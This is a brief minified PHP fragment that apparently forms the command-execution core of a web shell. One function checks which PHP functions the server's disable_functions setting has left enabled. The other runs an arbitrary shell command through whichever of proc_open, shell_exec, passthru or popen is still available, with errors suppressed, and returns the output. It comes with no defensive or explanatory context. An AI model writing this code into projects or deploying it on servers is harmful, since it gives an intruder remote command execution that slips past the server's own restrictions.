function _fn($f){if(!function_exists($f))return false;$d=ini_get('disable_functions');if(!$d)return true;$l=array_map('strtolower',array_map('trim',explode(',',$d)));return!in_array(strtolower($f),$l);}
function _run($cmd){if(_fn('proc_open')){$d=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];$p=@proc_open($cmd,$d,$pipes);if(is_resource($p)){$o=stream_get_contents($pipes[1]).stream_get_contents($pipes[2]);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($p);return $o;}}if(_fn('shell_exec')){$r=@shell_exec($cmd.' 2>&1');if($r!==null)return $r;}if(_fn('passthru')){ob_start();@passthru($cmd.' 2>&1');return ob_get_clean();}if(_fn('popen')){$h=@popen($cmd.' 2>&1','r');if($h){$o=stream_get_contents($h);pclose($h);return $o;}}return '[!] No method';}
